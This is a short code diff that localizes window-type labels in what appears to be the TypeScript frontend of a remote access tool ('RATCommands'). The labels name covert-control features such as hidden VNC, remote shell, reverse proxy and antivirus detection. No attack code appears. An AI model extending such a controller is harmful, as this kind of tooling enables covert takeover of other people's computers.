@@ -13,31 +13,32 @@ import { fetchStateCmd } from "./RATCommands";
 
 import { PhysicalSize, Window, getCurrentWindow } from "@tauri-apps/api/window";
 import { Webview } from "@tauri-apps/api/webview";
+import i18n from "../i18n/config";
 
 //import clientsTest from "../../../python_utils_testing/clients/test_clients.json";
 
 const translateWindowType = (type: string) => {
   switch (type) {
     case "client-info":
-      return "Client Info";
+      return i18n.t("windowTypes.clientInfo");
     case "hvnc":
-      return "HVNC";
+      return i18n.t("windowTypes.hvnc");
     case "process-viewer":
-      return "Process Viewer";
+      return i18n.t("windowTypes.processViewer");
     case "remote-desktop":
-      return "Remote Desktop";
+      return i18n.t("windowTypes.remoteDesktop");
     case "file-manager":
-      return "File Manager";
+      return i18n.t("windowTypes.fileManager");
     case "remote-shell":
-      return "Remote Shell";
+      return i18n.t("windowTypes.remoteShell");
     case "reverse-proxy":
-      return "Reverse Proxy";
+      return i18n.t("windowTypes.reverseProxy");
     case "av-detection":
-      return "Antivirus Detection";
+      return i18n.t("windowTypes.avDetection");
     case "fun":
-      return "Fun Stuff";
+      return i18n.t("windowTypes.fun");
     case "input-box":
-      return "Input Box";
+      return i18n.t("windowTypes.inputBox");
     default:
       return type;
   }
